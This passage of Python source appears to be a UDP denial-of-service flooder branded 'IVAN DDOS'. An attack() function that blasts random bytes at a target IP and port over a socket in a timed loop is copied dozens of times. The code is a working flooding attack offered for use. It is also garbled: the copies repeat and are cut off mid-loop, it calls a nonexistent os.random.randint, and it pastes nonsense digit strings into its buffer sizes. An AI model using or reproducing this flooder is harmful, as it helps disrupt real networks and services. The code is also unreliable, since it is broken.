        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
